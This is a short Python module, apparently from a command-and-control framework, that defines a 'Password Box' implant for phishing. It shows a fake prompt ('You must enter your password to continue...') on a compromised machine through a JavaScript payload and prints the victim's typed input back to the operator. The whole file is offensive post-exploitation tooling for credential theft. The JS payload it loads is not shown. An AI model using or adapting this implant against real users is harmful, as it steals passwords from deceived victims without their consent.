import core.job
import core.implant
import uuid

class PasswordBoxJob(core.job.Job):
    def done(self):
        self.results = self.data
        self.display()

    def display(self):
        self.shell.print_plain("Input contents:")
        self.shell.print_plain(self.data)

class PasswordBoxImplant(core.implant.Implant):

    NAME = "Password Box"
    DESCRIPTION = "Try to phish a user"
    AUTHORS = ["zerosum0x0"]
    STATE = "implant/phish/password_box"

    def load(self):
        self.options.register("Message", "You must enter your password to continue...", "Displayed to user")

    def job(self):
        return PasswordBoxJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/phish/password_box.js"
        self.dispatch(payloads, self.job)
